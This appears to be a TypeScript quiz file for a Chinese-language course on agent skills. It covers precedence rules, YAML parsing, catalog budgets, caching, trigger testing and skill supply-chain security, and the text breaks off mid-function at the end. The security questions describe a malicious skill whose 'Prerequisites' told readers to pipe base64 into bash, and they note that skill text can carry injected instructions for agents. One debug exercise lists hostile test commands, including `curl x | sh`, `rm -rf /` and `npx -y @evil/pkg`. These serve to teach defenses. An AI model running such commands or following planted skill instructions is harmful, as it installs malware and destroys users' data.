import type { QuizSpec } from '@/lib/quiz'

export const quiz: QuizSpec = {
  lessonId: 'L10x',
  questions: [
    {
      id: 'same-name-policy',
      kind: 'choice',
      prompt:
        '你在 `~/.claude/skills/pdf/` 有一份自己调好的 pdf skill；同事把另一份 `name: pdf` 的 skill 提交进了仓库的 `.claude/skills/pdf/`。你给团队写的内部 agent 照 agentskills.io 客户端实现指南实现了「project 覆盖 user」，README 里写着「同名优先级与 Claude Code 一致」。在 Claude Code 里打开这个仓库，生效的是哪份？README 对吗？',
      options: [
        {
          id: 'a',
          label:
            '仓库那份。指南把 project 覆盖 user 称为 "The universal convention across existing implementations"，README 没问题',
        },
        {
          id: 'b',
          label: '你那份。Claude Code 文档写的是 personal 覆盖 project，和指南正好相反，README 写错了',
        },
        { id: 'c', label: '两份都加载，由模型按 description 自己挑；README 谈不上对错' },
        { id: 'd', label: '后修改的那份赢，所以两边行为取决于谁最近改过文件' },
      ],
      correct: ['b'],
      explain: `B。

Claude Code 文档原文是 "Enterprise over personal, and personal over project"。实验一的表里这一行就是 \`claude-code  user\`，同一组文件在 \`agentskills-guide\` 下是 \`project\`。lab 的 C1、C2 分别钉这两条。

**标准只规定目录里装什么，谁赢是客户端的策略。**指南口中的「通用约定」，最先被这个格式的发起方自己的产品违反了。你的 agent 照指南实现没有错，错在 README 声称「一致」。

A 错：这正是那句「universal」的陷阱。四家里两家和它一致（指南本身、Gemini CLI 的 workspace 覆盖 user），Claude Code 相反，Codex 根本不按名字去重。

C 错：最接近这个描述的是 Codex，而且也不是「模型挑」——Codex 的去重键是路径，同名的全进目录，你显式打 \`$pdf\` 时因为有歧义一个都不选（C4）。Claude Code 是单一胜者。

D 错：没有一家按修改时间。lab 还专门要求结果与输入顺序无关：同层同名时 guide 取排序后第一个、gemini 取最后一个（C7）。

对应讲义第一节 1.2、实验一；断言 C1、C2、C4、C7。顺带一句：Cursor 的同名优先级文档没写，不要替它下结论。`,
    },
    {
      id: 'yaml-subset',
      kind: 'choice',
      prompt:
        '你的 TS agent 用 js-yaml 解析 skill 的 frontmatter，另一个组的 Python 工具用 `yaml.safe_load` 读同一批 skill。一个 skill 写着 `metadata:` 下面 `version: 1.0`，另一个写着 `disable-model-invocation: yes`。同事说：「YAML 是标准格式，两个主流库结果肯定一样。」哪个判断对？',
      options: [
        { id: 'a', label: '同事说得对：两个都是成熟的主流库，标量类型的结果相同' },
        { id: 'b', label: '要求所有作者给每个值加引号就彻底解决了，不需要自己定子集' },
        {
          id: 'c',
          label:
            '会分歧：PyYAML 给 float 1.0 和布尔 True，js-yaml 给整数 1 和字符串 "yes"。解析层应一律返回字符串，布尔由字段层只认 true / false',
        },
        { id: 'd', label: '换成 strictyaml 即可，它和 PyYAML、js-yaml 在所有样例上都一致' },
      ],
      correct: ['c'],
      explain: `C。

实验二第 01 行：\`1.0\` 在 PyYAML 是 \`float:1.0\`，在 js-yaml 是 \`int:1\`；第 04 行：\`yes\` 在 PyYAML 是 \`bool:true\`，在 js-yaml 是 \`str:"yes"\`。后一个最危险：一个按 \`=== true\` 判断的 TS 宿主认为它**没有**被禁用，Python 宿主和 Claude Code（v2.1.218 起认 yes）认为禁用了——同一份 skill，「模型能不能自己调它」两边答案相反，没有一边报错。

lab 的子集规则：标量一律字符串（P4 断言 \`1.0\`、\`no\`、\`0123\`、日期、\`~\` 全是字符串），布尔字段只认 \`true\` / \`false\`，其它值 strict 报错、lenient 按默认值并告警。

A 错：实验二就是反例，24 个样例里 PyYAML 和 js-yaml 只有 14 个一致。

B 错：引号对你自己写的 skill 有用（规范的例子就写 \`version: "1.0"\`），但运行时要读的大多是别人为别的客户端写的 skill，你要求不了。引号也管不到另外两类分歧：literal 块标量的末尾换行（第 21 行两库不同）和重复 key（PyYAML 后者覆盖、js-yaml 报错）。

D 错：把 yaml 和 strictyaml 也拉进来四家一起比，一致的只剩 7/24。

对应讲义第一节 1.4、YAML 子集那个 Drill；断言 P4、P5、P6。`,
    },
    {
      id: 'skill-vs-mcp',
      kind: 'choice',
      prompt:
        '一份内部技术分享的结论页：「skill 比 MCP 工具省两个数量级 token；arXiv 2609.00006 也说 skill 采用率 9/11 已经超过 MCP 的 8/11。所以我们把所有 MCP server 改写成 skill。」按这一节的数据，哪个评价最准确？',
      options: [
        { id: 'a', label: '结论成立：skill 目录条目的格式天生比 tools/list 紧凑上百倍' },
        { id: 'b', label: '既然格式只差 1.43 倍，skill 和 MCP 就是等价的，按团队喜好选' },
        { id: 'c', label: '结论成立，但理由是：skill 目录能进前缀缓存，MCP 工具定义不能' },
        {
          id: 'd',
          label:
            '同一段 description，MCP 工具定义只贵约 1.43 倍，省钱来自把「怎么做」推迟到激活之后；9/11 对 8/11 只差一个系统。要碰外部运行中的系统和凭据，仍然是 MCP 的活',
        },
      ],
      correct: ['d'],
      explain: `D。

实验五把同一段 175 字符的 description 分别做成 skill 的 XML 目录条目和带三参数 \`inputSchema\` 的 MCP 工具定义：N=30 时 2,402 对 3,443 token，**1.43 倍**；多出来的就是 \`inputSchema\`。K9 断言这个倍数落在 1.3–2 之间。

「两个数量级」的直觉来自写法：MCP 工具的 description 没有第二层可去，必须一次说清所有用法；skill 的 description 只说「何时用」。而 MCP 那边也在推迟：L10 第七节的 tool search、Codex 的 \`defer_loading\`。两边在往「常驻短索引，按需拉全文」收敛。

9/11 对 8/11：分母是作者挑的 11 个系统，差值只有 Pi 一个（实现 agentskills.io、拒绝 MCP），两个都不实现的是同一批极简系统。更有信息量的读法是**除了两个极简系统，所有人两个都实现了**。论文自己的分工建议是 skill 管能力模板、MCP 管外部集成。

A 错：1.43 倍，不是上百倍。

B 错：等价忽略了「谁执行、能不能保证」这条轴。MCP 工具由外部进程确定性执行、可以持有凭据；skill 要靠模型依据 description 决定激活，不能保证每次生效（第四节那张表）。两者是上下层：Codex 的 skill 可以在 \`agents/openai.yaml\` 里把一个 MCP server 声明为依赖。

C 错：工具定义在前缀最前面的 tools 层，和目录一样被缓存（L15）。缓存不区分它们。

对应讲义第二节 2.2、第四节的 Note；断言 K9。`,
    },
    {
      id: 'catalog-budget',
      kind: 'choice',
      prompt:
        '你的 agent 用 8,000 字符的目录预算（Codex 在窗口未知时的默认值），lines 格式。团队已经装了 30 个 skill，每个 description 约 200 字符，目录 7,883 字符，一切正常。新同事又装了第 31 个。按 lab 的 `renderCatalog`，接下来会发生什么？',
      options: [
        {
          id: 'a',
          label:
            '进入阶段 2：所有 skill 的 description 一起被截短到 193–194 字符并以 … 结尾，名字和路径都在；结果只取决于输入内容，与输入顺序无关',
        },
        { id: 'b', label: '只有新装的第 31 个被省略，原来 30 个不受影响——先来后到' },
        {
          id: 'c',
          label: '最少被调用的 skill 先丢 description，名字保留——lab 照搬了 Claude Code，因为它对常用 skill 最友好',
        },
        { id: 'd', label: '每条 description 都远低于 1024 字符的上限，什么都不会发生' },
      ],
      correct: ['a'],
      explain: `A。

实验四：30 个时阶段 1、7,883 字符，离预算只差 117；装第 31 个就放不下全量了。所有 description 都只剩一个 \`…\` 时放得下，于是进阶段 2：从目录顺序的第一个开始轮转，每轮给每个 skill 加一个码点，加不动的出局。**一次安装，所有人一起变短**——到 60 个时每条只剩 68–69 字符。

三条性质各有一条断言：

- K4：输入打乱 10 次，输出逐字节相同。目录在前缀里，它必须是内容的纯函数
- K6：阶段 2 的截短长度两两相差不超过 1，名字和路径都在
- K7：阶段 3 省略的是排序后序列的后缀，告警里有省略数

B 错：只有连全部 \`…\` 都放不下时才进阶段 3；省略的也不是「后装的」，而是目录顺序（builtin、enterprise、project、user，同层按名字）的后缀。实验四在 200 个时省略了 69 个，全是 user 层。

C 错：前半句是 Claude Code 的真实规则（"drops descriptions starting with the skills you invoke least"），但 lab 刻意没用它：它依赖使用次数，输出不再是内容的纯函数，同一组 skill 在两台机器上目录文本不同，前缀缓存不能共享；新装的 skill 调用次数为 0，天然最先被砍，于是更不会被触发。

D 错：1024 是单条 description 的上限，目录预算管的是总长，两回事。

对应讲义第二节 2.3 和三阶段预算那个 Drill；断言 K4、K6、K7。`,
    },
    {
      id: 'cache-ledger',
      kind: 'choice',
      multi: true,
      prompt:
        '关于前缀缓存下 skill 的账（缓存写 1.25 倍、读 0.1 倍；前缀层级 tools → system → messages），下面哪些说法成立？（多选）',
      options: [
        {
          id: 'a',
          label: '一段 2,000 token 的流程知识、会话 20 轮：第 5 轮才激活的 skill，总花费约是常驻 AGENTS.md 的 90%',
        },
        {
          id: 'b',
          label: 'Codex 的 system prompt 写着 "Do not carry skills across turns"，所以在 Codex 里激活过的正文之后不再计费',
        },
        {
          id: 'c',
          label: '会话中途装一个 skill：目录放在激活工具的 enum 里，比放在 system prompt 里多失效的只是 tools 那一层',
        },
        { id: 'd', label: '把新 skill 作为一条新消息追加在对话末尾，不会让任何已缓存的前缀失效' },
        { id: 'e', label: '缓存读只收 0.1 倍，所以激活过的长正文对模型注意力的占用也打了一折' },
      ],
      correct: ['a', 'c', 'd'],
      explain: `A、C、D。

A 对：实验六，第 5 轮激活 5,689 对 AGENTS.md 的 6,300，90%。第 1 轮就激活是 6,489，103%，比常驻还贵，多出来的是目录条目。**skill 省钱只来自「大多数会话根本不激活」**：整场没激活才 189，3%。

C 对：实验五的第二张表，enum 里 45,965 token 失效，system 里 43,000，差 2,965，正好是 tools 层。放哪层只差一层，大头是 40,000 token 的对话历史。

D 对：追加在末尾失效 0，本轮计费 4,596.50，对比改前缀的五万多。**分水岭是改没改前缀。**这也是 lab 的激活工具不用 enum 的理由：enum 让工具定义跟着 skill 集合变（A6 断言工具定义是常量）。

B 错：那句话约束的是**模型行为**——不要凭上一轮的印象继续照做。激活时注入的正文已经在历史里，之后每轮照样按缓存读计费。

E 错：L06 那条，缓存一分钱不省注意力。计费打折，上下文占用不打折。

对应讲义第二节 2.5、2.6 和那个 Key；断言 A6。`,
    },
    {
      id: 'trigger-protocol',
      kind: 'choice',
      prompt:
        '你按官方 description 评测协议测一个 skill：20 条查询（10 条该触发、10 条不该），每条跑 3 次，触发率高于 0.5 算通过。结果 17/20 通过。你准备在周报里写「该 skill 触发率 85%」。哪种说法最准确？',
      options: [
        { id: 'a', label: '可以写：20 条 × 3 次是 60 次运行，样本量已经足够' },
        { id: 'b', label: '应该写成「每条查询的触发率都高于 50%」，因为阈值就是 0.5' },
        {
          id: 'c',
          label:
            '不能这么写：17/20 是「被判通过的查询比例」。3 次里 2 次就算过，真实触发率 0.6 和 0.4 的查询被判通过的概率是 64.8% 和 35.2%，这个协议分不开它们',
        },
        { id: 'd', label: '应该先对照官方页面给出的参考触发率，再判断 85% 算高还是低' },
      ],
      correct: ['c'],
      explain: `C。

「3 次里至少 2 次」被判通过的概率，按二项分布：

| 真实触发率 | 0.1 | 0.4 | 0.5 | 0.6 | 0.9 |
|---|---|---|---|---|---|
| 被判通过 | 2.8% | 35.2% | 50.0% | 64.8% | 97.2% |

**它能区分 0.9 和 0.1，区分不了 0.6 和 0.4。**这是 L18 第三节同一个问题：N 太小，先算你能看见多大的差。

还有一层：如果你用 skill-creator 的 \`run_eval.py\` 跑，被测的不是你的 skill，而是写进 \`.claude/commands/\` 的临时 command，正文只有一句占位；第一个工具调用不是 \`Skill\` 或 \`Read\`（比如先 Grep 一下仓库）就判为未触发。它量的是**这段 description 的首动作触发率**。

A 错：60 次运行被压成了 20 个「过 / 不过」，单条查询的触发率被阈值抹掉了；而且量的对象也不是「skill 的触发率」。

B 错：被判通过不等于触发率高于 0.5——真实 0.4 的查询有 35.2% 的机会被判通过，真实 0.6 的有 35.2% 的机会被判不通过。

D 错：同一页给了完整的评测协议，**没有给任何触发率数字**，没有可对照的参考值。

对应讲义第三节 3.1、3.2。要测得更准：评测集里放 near-miss 负例，每条跑多于 3 次（第三节的 Pitfall）。`,
    },
    {
      id: 'pushy-overlap',
      kind: 'choice',
      prompt:
        '团队有 8 个文档类 skill，作者们都照官方建议 "Err on the side of being pushy" 把 description 写成「只要提到 X 就用」。最近模型经常挑错 skill。lab 实验三给出：pushy 写法两两之间小写词 Jaccard 平均 6651 bp，「意图 + 边界」写法 1410 bp。哪种理解最准确？',
      options: [
        { id: 'a', label: '6651 bp 说明 pushy 写法有 66.51% 的误触发率，改写后能降到 14.10%' },
        { id: 'b', label: '这是 Codex 才有的问题：它源码里有 BM25 skill 选择器，打开就能消歧' },
        { id: 'c', label: '把 8 个合并成一个大 skill 最省事，正文多长都不影响效果' },
        {
          id: 'd',
          label:
            'Jaccard 只是确定性的词重叠代理，不预测触发率；它说明每个作者都往宽了写时，触发区域必然互相覆盖，而目前没有哪家客户端做确定性消歧',
        },
      ],
      correct: ['d'],
      explain: `D。

实验三自己就标注了：指标是小写词集合的 Jaccard，**只是确定性的重叠代理，不预测真实触发率**。它揭示的是结构问题：pushy 写法里最像的一对 pdf/docx 有 7857 bp，改成「意图 + 边界（不适用于…）」后降到 2692。同一页官方建议既要 pushy、又要不重叠，两条在打架。

没有确定性消歧：Codex 的办法是 system prompt 里一句 "choose the minimal set that covers the request"。改法是写意图和边界，比如 "Extract text, tables and form fields from existing PDF files. Not for creating new PDFs or editing Word files."；评测集里放和你共享关键词的 near-miss 负例。

A 错：把代理指标当成了触发率。实验三的数字不能换算成任何概率。

B 错：那套 BM25 之类的选择器只在影子模式下运行，不改 prompt 内容；而且这个问题所有客户端都有。

C 错：合并会让正文远超规范「建议少于 5000 token」。在 Claude Code 里这有硬后果：压缩后每个 skill 只保留前 5,000 token（A7 照这个数字写）。而且一次激活就把所有流程都拉进来，推迟带来的节省也没了。

对应讲义第三节 3.3 和那个 Pitfall；断言 A7。`,
    },
    {
      id: 'not-a-skill',
      kind: 'choice',
      multi: true,
      prompt: '下面五个需求，哪些**不该**做成「模型可以自己调用」的 skill？（多选）',
      options: [
        { id: 'a', label: '每次编辑完文件都必须跑格式化器，一次都不能漏' },
        { id: 'b', label: '「本仓库用 pnpm 不用 npm；提交信息写中文」，几乎每个任务都相关' },
        { id: 'c', label: '编辑 `migrations/*.sql` 时要遵守的命名和回滚约定' },
        { id: 'd', label: '每季度一次、40 步的发布复盘流程，附带模板和两个校验脚本' },
        { id: 'e', label: '部署到生产环境的流程：只想让人显式触发，不希望模型自己决定什么时候跑' },
      ],
      correct: ['a', 'b', 'c', 'e'],
      explain: `A、B、C、E。

按第四节的判断顺序逐条走：

1. A，必须每次都成立 → **hook**。skill 的触发是「description 匹配并且模型判断自己搞不定」，不能保证。Claude Code 故障排查一节原话："Claude skipped a rule that must hold every time: move the rule into a hook."
2. B，几乎每个任务都相关 → **AGENTS.md / rules**。实验六：第 1 轮就激活的 skill 是常驻的 103%，高频激活不省钱。
3. C，按文件路径确定触发 → **glob rule**（Cursor 的 \`globs\`、skill 的 \`paths\`）。Cursor 的 \`/migrate-to-skills\` 明确不迁移带 \`globs\` 的 rule，因为它们 "have explicit triggering conditions that differ from skill behavior"。
4. E，只想手动跑 → \`disable-model-invocation: true\` 的 skill。它仍然是 skill，但不是「模型可调」的；它不进目录，目录成本为零。注意 Codex 要在 \`agents/openai.yaml\` 里另写 \`allow_implicit_invocation: false\`，只写一处，另一边照常隐式触发，不报错。

D 不选：偶尔才需要、篇幅大、带脚本和模板的流程知识，正是 skill 的正确用法——平时只付一条目录的钱，用时才把 40 步和模板拉进来。

对应讲义第四节那张表和七步判断顺序。`,
    },
    {
      id: 'allowed-tools',
      kind: 'choice',
      prompt:
        '你 clone 了一个从没打开过的开源仓库，在里面用 `claude -p` 跑一个任务。仓库的 `.claude/skills/release/SKILL.md` 写着 `allowed-tools: Bash(git push:*)`。同事说：「放心，没点过 workspace trust，项目里的配置都不会生效；再说 allowed-tools 本来就是把 skill 限制在这几个工具上的。」按这一节，哪个说法对？',
      options: [
        {
          id: 'a',
          label:
            '两句都错：allowed-tools 是「预批准」，不是限制，其它工具照样能调；Claude Code 文档明说 workspace trust 不管这个字段，没信任过的文件夹里 -p 运行也生效',
        },
        { id: 'b', label: '同事两句都对' },
        { id: 'c', label: '第一句对、第二句错：没信任的文件夹里 skill 根本不会被加载' },
        { id: 'd', label: '第一句错、第二句对：字段生效了，但它把 skill 限制在 git push 上，风险可控' },
      ],
      correct: ['a'],
      explain: `A。

Claude Code 文档两句原话：

> "It does not restrict which tools are available: every tool remains callable"
>
> "Workspace trust doesn't gate this field. Claude Code applies a project skill's \`allowed-tools\` even in a \`-p\` run in a folder you've never trusted."

对照同一产品的权限文档：项目 \`.claude/settings.json\` 的 allow 规则 "applies them only after you accept the workspace trust dialog"。**授予能力的要先信任，这条原则在 settings.json 上执行了，在 SKILL.md 上没有。**

lab 的 \`scriptApproval\` 比它严：未信任的 skill 即使带 \`allowed-tools\` 也直接 deny（S3）；预批准是精确匹配，命令里出现 shell 元字符就不算命中（S2）。

B、D 错：「限制」是对这个字段最常见的误读。规范原文是 "pre-approved to run"。

C 错：文档那句恰恰说明 skill 在没信任的文件夹里会被加载、字段会被应用。

顺带两个容易混的事实：Codex 和 Gemini CLI 的 parser 根本不读这个字段；Claude Agent SDK 的 \`skills\` 列表也不是边界，未列出的 skill "remain on disk and stay reachable through Read and Bash"。

对应讲义第五节 5.2；断言 S2、S3。`,
    },
    {
      id: 'supply-chain',
      kind: 'choice',
      prompt:
        '安全组要给公司内部的 skill 市场加一道上架扫描，方案是：「扫描每个 skill 的 `scripts/` 目录，命中恶意特征就拒绝；另外，论文说 skill 市场有 26.1% 是恶意的，所以默认拒绝所有带脚本的 skill。」这个方案的问题是？',
      options: [
        { id: 'a', label: '没问题，`scripts/` 是 skill 里唯一能执行代码的地方' },
        { id: 'b', label: '问题只在数字：应该引 SkillProbe 的 "over 90% ... failed"，更保守' },
        { id: 'c', label: '问题只在范围：应该连 `assets/` 一起扫；正文是写给模型的说明，不会藏载荷' },
        {
          id: 'd',
          label:
            '两处都有问题：ClawHavoc 的载荷在 SKILL.md 正文的「前置条件」里，只扫 `scripts/` 看不到；26.1% 是「至少含一个漏洞」，不是恶意率——动态验证确认的恶意约 0.16%',
        },
      ],
      correct: ['d'],
      explain: `D。

ClawHavoc：Koi Security 审计 ClawHub 当时全部 2,857 个 skill，341 个恶意，其中 335 个来自同一个战役。文档看起来很专业，但有一节 "Prerequisites" 要你先装个东西——复制一段 \`echo '<base64>' | base64 -D | bash\`，最终落地 macOS 窃密木马。**载荷在正文里，而且是写给人看的。**

三个数字分子完全不同：

| 论文 | 方法 | 数字 |
|---|---|---|
| Liu et al.，98,380 个 | 静态匹配加动态行为验证 | 确认恶意 157 个，约 0.16% |
| Liu et al.，31,132 个 | 静态分析加 LLM 分类 | 26.1% 至少含一个漏洞 |
| SkillProbe，下载量前 2,500 | 多 agent LLM 审计 | over 90% failed |

第一篇里超过一半的恶意 skill 来自同一个攻击者——发布者账号级的处置，边际收益远大于逐个扫 skill。

A 错：一个 skill 让代码跑起来有三条路：激活即执行（Claude Code 正文里的「! 加反引号」语法）、正文指示跑脚本、正文指示从外部拉代码（\`npx\`、\`uvx\`、「先装这个」）。后者拉下来的代码根本不在 skill 目录里。

B 错：换一个更大的数字不解决问题。SkillProbe 把「通过了基线审计、但报告里有轻微发现」的 59.8% 也算进了未通过，分子又是另一回事。**报「X% 有问题」而不说分子，等于没报。**

C 错：正文恰恰是载荷所在；\`references/\` 还是注入通道——Codex 的 system prompt 要求模型执行前必须自己读完引用的文件。

对应讲义第五节 5.1、5.3、5.4、5.7。`,
    },
    {
      id: 'debug-approval',
      kind: 'debug',
      prompt:
        '同学交上来 TODO 7，外加一段把流水线串起来的 `buildCatalog`（agent 启动时调用）。他说：「S3、S4 是照着参考实现的注释写的，S 组应该没问题。」跑 `pnpm verify:l10x`，哪几条会红、红在哪个输入上？另外还有一个 bug verify 抓不到——找出来，说明为什么抓不到、在什么配置下会在线上出事。',
      lang: 'ts',
      code: `function myScriptApproval(a: ApprovalInput): { decision: Approval; reasons: string[] } {
  if (a.skill.trust === 'project-untrusted') return { decision: 'deny', reasons: ['UNTRUSTED'] }
  const cmd = a.command.trim().replace(/\\s+/g, ' ')
  const hit = a.skill.allowedTools.some((t) => {
    if (t === 'Bash') return true
    const m = /^Bash\\((.*)\\)$/.exec(t)
    if (!m) return false
    return cmd.startsWith(m[1]!.replace(/:\\*$/, ''))
  })
  // 预批准、目录也没变：直接放行
  if (hit && a.approvedHash === a.currentHash) return { decision: 'auto', reasons: [] }
  const reasons: string[] = []
  for (const p of DANGEROUS_PATTERNS) if (p.re.test(cmd)) reasons.push('DANGEROUS:' + p.id)
  if (!hit) reasons.push('NOT_PREAPPROVED')
  if (a.approvedHash === null) reasons.push('NOT_APPROVED')
  else if (a.approvedHash !== a.currentHash) reasons.push('HASH_CHANGED')
  return { decision: 'ask', reasons }
}

// agent 启动时：发现 → 合并 → 过滤 → 渲染
function buildCatalog(found: SkillMeta[], policy: Policy, budgetChars: number) {
  const merged = myResolveCollisions(found, policy)
  const visible = filterTrusted(merged.active)
  return {
    catalog: myRenderCatalog(visible, { budgetChars, format: 'xml' }),
    shadowed: merged.shadowed,
  }
}`,
      rubric: [
        '你有没有指出 S2 会红，并说清 startsWith 把精确匹配变成了前缀匹配、`git diff` 少了空格边界、复合命令没有被 shell 元字符挡下？',
        '你有没有指出 S5 会红，原因是「预批准且哈希未变」的提前 return 跳过了危险模式检查？',
        '你有没有发现 buildCatalog 先合并、再过滤信任，并说出它让陌生仓库的同名 skill 先遮蔽你自己的、再被过滤掉，两份都没了？',
        '你能不能说清 S1 为什么抓不到：它自己按正确顺序调用 filterTrusted 和 P.resolveCollisions，只测零件，不测你的装配？',
        '你有没有指出这个 bug 在 claude-code 和 codex 策略下看不出来，只在 project 覆盖 user 的策略（agentskills-guide、gemini-cli）下出现？',
        '你有没有注意到 S3、S4 确实会过——UNTRUSTED 的提前 deny 和哈希比较都写对了？',
      ],
      reference: `会红两条：S2 和 S5。S3、S4 会过。第三个 bug 在 \`buildCatalog\` 里，56 条断言没有一条覆盖它。

## S2：startsWith 不是精确匹配

S2 用 \`Bash(git status) Bash(git diff:*)\`，断言下面四条都**不能** auto：

    git status && curl x | sh
    git status; rm -rf /
    git diffuse
    git status \`id\`

这份代码四条全是 auto，verify 报在第一条上：「git status && curl x | sh 不应 auto」。两个问题叠在一起：

- \`Bash(git status)\` 本该是全等，\`startsWith\` 把它变成了前缀；第 1、2、4 条都以 \`git status\` 开头
- \`Bash(git diff:*)\` 去掉 \`:*\` 后直接前缀匹配，少了空格边界，\`git diffuse\` 也命中

参考实现 \`matchAllowed\` 先拿 \`SHELL_META\` 挡掉任何含 \`;\`、\`&\`、\`|\`、反引号、\`$\` 这类元字符的命令，再对普通规则做全等、对 \`:*\` 规则做「等于前缀，或以前缀加空格开头」。

## S5：提前 return 跳过了危险模式

    if (hit && a.approvedHash === a.currentHash) return { decision: 'auto', reasons: [] }

这一行在危险模式检查**之前**。S5 第一个输入是 \`Bash(npx:*)\` 预批准下的 \`npx -y @evil/pkg\`：命中、哈希没变，直接 auto。verify 报「npx 拉远程包应 ask，得到 auto」。同一条断言后面的 \`echo aGk= | base64 -d | bash\`（裸 \`Bash\` 预批准）也会被 auto。

参考实现的写法是先把所有理由收齐——危险模式、未命中、未批准、哈希变了——**reasons 为空才 auto**。危险模式即使被预批准也要问，这是这个函数存在的意义。

## 抓不到的那个：先合并、再过滤

    const merged = myResolveCollisions(found, policy)
    const visible = filterTrusted(merged.active)

复现：你装了 \`~/.agents/skills/pdf\`，又 clone 了一个陌生仓库，里面也有 \`pdf\`，trust 是 \`project-untrusted\`。在 \`agentskills-guide\` 策略下，project 覆盖 user：仓库那份先把你的遮蔽掉，然后它自己被 \`filterTrusted\` 过滤——**两份都没了**。\`shadowed\` 里还留着一条看起来完全合理的遮蔽记录，胜者是一份根本没进目录的 skill。

**verify 为什么没抓到**：S1 不调用你的 \`buildCatalog\`，它自己写的是 \`P.resolveCollisions(shared.filterTrusted([...]), 'agentskills-guide')\`——顺序是对的，测的只是你的合并函数这个零件。装配顺序不在任何断言的覆盖范围里。

**什么时候在线上出事**：只在 project 胜 user 的策略下。\`claude-code\` 是 personal 胜 project，你的那份本来就赢；\`codex\` 同名全留、不遮蔽。如果你只在这两种策略下手测过，就会带着它上线。\`gemini-cli\`（workspace 胜 user）和 \`agentskills-guide\` 都会触发。

修法就是把两行对调：先 \`filterTrusted(found)\`，再合并。未信任的 skill 应该从来不出现在目录里，而不是列出来再在激活或执行时拒绝。

## 小结

| bug | 后果 | 被哪条抓到 | 为什么 |
|---|---|---|---|
| 前缀匹配、不查元字符 | 复合命令被自动放行 | S2 | —— |
| 提前 auto，跳过危险模式 | 预批准的 npx、base64 管道直接执行 | S5 | —— |
| 先合并再过滤 | 陌生仓库让你自己的 skill 消失 | 无 | S1 自己按正确顺序拼流水线，只测零件 |

零件全绿不等于装配正确。给 \`buildCatalog\` 本身补一条断言：\`agentskills-guide\` 策略、user 一份加未信任 project 一份同名，目录里必须有 user 那份。`,
    },
    {
      id: 'debug-budget',
      kind: 'debug',
      prompt:
        '同学的 TODO 3 和 TODO 5。第一次跑 verify，V4 和 K8 红。他把 `myCpLen` 改成 `[...s].length`，V4 绿了，K8 还是红：「只用了 2268 / 2500：预算按 UTF-16 码元算了，emoji 被算成 2」。他很困惑：「`full` 那一行我也用的 `.length`，K4、K6、K7 都过了啊。」解释 K8 为什么还红、K4/K6/K7 为什么抓不到、`full` 那一行到底对不对，并给出最小修改。',
      lang: 'ts',
      code: `function myCpLen(s: string): number {
  return s.length
}

function myRenderCatalog(skills: SkillMeta[], opts: CatalogOpts): CatalogResult {
  const { budgetChars: budget, format } = opts
  const order = catalogOrder(skills)
  if (order.length === 0) return { text: '', stage: 1, entries: [], omitted: [], warning: null }
  const full = order.map((s) => catalogDesc(s).length)
  const text = (ks: number[]) => wrapCatalog(order.map((s, i) => renderEntry(s, ks[i]!, format)), format)
  const entries = (ks: number[]) =>
    order.map((s, i) => ({ name: s.name, location: s.location, shown: ks[i]!, full: full[i]! }))

  // 阶段 1：全量放得下
  if (text(full).length <= budget)
    return { text: text(full), stage: 1, entries: entries(full), omitted: [], warning: null }

  // 阶段 2：轮转截短
  const ks = order.map(() => 0)
  if (text(ks).length <= budget) {
    const stuck = order.map((_, i) => full[i] === 0)
    let progress = true
    while (progress) {
      progress = false
      for (let i = 0; i < order.length; i++) {
        if (stuck[i]) continue
        ks[i]!++
        if (text(ks).length <= budget) {
          progress = true
          if (ks[i] === full[i]) stuck[i] = true
        } else {
          ks[i]!--
          stuck[i] = true
        }
      }
    }
    return { text: text(ks), stage: 2, entries: entries(ks), omitted: [], warning: '超出预算 ' + budget }
  }

  // 阶段 3：去掉 description，贪心放
  const minimal = order.map((s) => renderEntry(s, null, format))
  let n = 0
  while (n < order.length && wrapCatalog(minimal.slice(0, n + 1), format).length <= budget) n++
  const omitted = order.slice(n).map((s) => s.name)
  return {
    text: wrapCatalog(minimal.slice(0, n), format),
    stage: 3,
    entries: entries(order.map(() => 0)).slice(0, n),
    omitted,
    warning: '超出预算 ' + budget + '，另有 ' + omitted.length + ' 个 skill 未列出',
  }
}`,
      rubric: [
        '你有没有指出 myRenderCatalog 根本没调用 myCpLen，所以修好 myCpLen 只会让 V4 变绿？',
        '你有没有说清同一个 .length：作用在 catalogDesc 返回的码点数组上是对的，作用在渲染出来的字符串上是 UTF-16 码元，是错的？',
        '你有没有找全四处要改的地方：阶段 1 的判断、阶段 2 的门槛、阶段 2 的轮转、阶段 3 的贪心？',
        '你能不能解释 K4、K6、K7 为什么过：它们的夹具全是 ASCII，码元数等于码点数？',
        '你有没有意识到中文夹具也抓不到它——中文在 BMP 里，只有 emoji 这类 BMP 之外的字符才会被算成 2？',
        '你有没有说出这个 bug 的方向：只会少用预算、过早截短或多省略，永远不会超预算，所以 K8 里「不超预算」那半句是过的？',
      ],
      reference: `**K8 还红，是因为 \`myRenderCatalog\` 从头到尾没调用 \`myCpLen\`。**它直接在渲染出来的字符串上用 \`.length\`，那是 UTF-16 码元数。修好 \`myCpLen\` 只会让 V4 变绿——V4 断言的是 \`cpLen("a😀b") === 3\` 和「1024 个 emoji 的 description 合法」，走的是校验器。

## 同一个 .length，两种类型

| 位置 | .length 作用在 | 数的是 | 对不对 |
|---|---|---|---|
| \`full\` | \`catalogDesc(s)\` 的返回值 | 码点数组的元素个数 | 对 |
| 阶段 1 判断 | \`text(full)\`，字符串 | UTF-16 码元 | 错 |
| 阶段 2 门槛和轮转 | \`text(ks)\`，字符串 | UTF-16 码元 | 错 |
| 阶段 3 贪心 | \`wrapCatalog(...)\`，字符串 | UTF-16 码元 | 错 |

\`catalogDesc\` 返回的是 \`string[]\`——参考实现用 \`[...s]\` 把 description 拆成码点数组，截短也按这个数组算。所以 \`full\` 那一行是对的；**同一个 token，换了类型就换了单位**，读代码时看不出来。

K8 的夹具是 12 个 description 为 \`'😀中'.repeat(150)\` 的 skill，预算 2,500。每个 😀 被当成 2，轮转在码点数远没到预算时就停了：实际只用了 2,268 个码点。断言要求剩余不超过 12（每个 skill 最多差一个码点），于是红。

## 为什么 K4、K6、K7 抓不到

它们的夹具是 \`longDesc\`：\`Workflow i guidance with checks and examples ...\`，名字和路径也全是 ASCII。ASCII 下码元数等于码点数，这份代码和参考实现逐字节相同。

而且**中文夹具也抓不到它**：中文在 BMP 里，一个汉字一个 UTF-16 码元。K8 夹具里的「中」不起作用，起作用的是 BMP 之外的 😀。

## bug 的方向

\`.length\` 只会多算，不会少算。所以这份代码永远不超预算——K6、K7、K8 里「总长不超预算」那半句都过。它的错是另一个方向：

- 阶段 1：一份按码点放得下的目录被判成放不下，所有 description 被无谓地截短、带上 \`…\`
- 阶段 2：每条少显示几个字符，预算没用满（K8）
- 阶段 3：多省略几个 skill

## 最小修改

    function myCpLen(s: string): number {
